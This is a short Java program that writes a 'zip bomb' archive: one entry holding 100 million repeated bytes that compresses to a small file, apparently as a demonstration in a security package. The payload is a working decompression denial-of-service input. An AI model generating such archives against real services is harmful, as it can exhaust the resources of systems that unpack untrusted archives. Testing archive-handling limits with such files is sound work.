package io.github.adamw7.security;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class ZipB {
	
	private final static Logger log = LogManager.getLogger(ZipB.class.getName());

	public static void main(String[] args) throws IOException {
		construct(100000000L);
	}

	public static void construct(long len) throws IOException {
		check(len);
		log.info("Starting construction of Zip Bomb containing: {} bytes", len);
		long start = System.currentTimeMillis();
		File file = new File("b.zip");
		file.delete();
		try (ZipOutputStream zout = new ZipOutputStream(new FileOutputStream(file))) {
			ZipEntry entry = new ZipEntry("a");
	        entry.setComment("Created for fun");
	        zout.putNextEntry(entry);
			
			for (int i = 0; i < len; ++i) {
				zout.write(createBatch());
			}
		}

		log.info("Zip file size: {} bytes", file::length);
		log.info("Took {} secs", () -> (System.currentTimeMillis() - start)/1000);
	}

	private static void check(long len) {
		if (len <= 0) {
			throw new IllegalArgumentException("Invalid length: " + len);
		}
	}

	private static byte[] createBatch() {
		return new byte[] { 'a' };
	}
}
